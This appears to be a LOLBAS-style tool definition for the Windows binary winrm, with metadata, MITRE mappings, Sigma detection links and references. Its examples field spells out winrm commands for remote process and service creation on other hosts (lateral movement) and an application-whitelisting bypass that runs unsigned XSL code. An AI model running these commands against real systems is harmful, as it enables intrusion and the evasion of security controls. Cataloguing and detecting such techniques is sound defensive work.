---
id: windows-execution-winrm
namespace: windows:execution:winrm
name: winrm
description: 'Script used for manage Windows RM settings Located at: C:\Windows\System32\winrm.vbs;
  C:\Windows\SysWOW64\winrm.vbs.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
- security.defense-evasion.bypass
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- winrm
parameters: []
features:
- file-system
- pipes-stdin
- pipes-stdout
- stealth
execution:
  template: winrm
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Lateral movement/Remote Command Execution via WMI Win32_Process class
    over the WinRM protocol (Proxy execution)
  command: winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
- description: Lateral movement/Remote Command Execution via WMI Win32_Service class
    over the WinRM protocol (Proxy execution)
  command: winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"}
    -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil
    -r:http://acmedc:5985
- description: Bypass AWL solutions by copying cscript.exe to an attacker-controlled
    location; creating a malicious WsmPty.xsl in the same location, and executing
    winrm.vbs via the relocated cscript.exe. (Execute arbitrary, unsigned code via
    XSL script)
  command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get
    wmicimv2/Win32_Process?Handle=4 -format:pretty'
references:
- label: windows-operating-system-archaeology
  url: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- label: watch?v=3gz1QmiMhss
  url: https://www.youtube.com/watch?v=3gz1QmiMhss
- label: windows-operating-system-archaeology
  url: https://github.com/enigma0x3/windows-operating-system-archaeology
- label: ''
  url: https://redcanary.com/blog/lateral-movement-winrm-wmi/
- label: '994405551751815170'
  url: https://twitter.com/bohops/status/994405551751815170
- label: application-whitelisting-bypass-and-arbitrary-unsi
  url: https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404
- label: wp-windows-management-instrumentation.pdf
  url: https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
techniques:
- execution
- defense-evasion
mitre_ids:
- T1216
- T1220
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml
- type: blockrule
  url: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
install:
- method: choco
  package_name: winrm
  commands:
  - choco install winrm
---

# winrm

winrm is a Windows LOLBin. Script used for manage Windows RM settings Located at: C:\Windows\System32\winrm.vbs; C:\Windows\SysWOW64\winrm.vbs.
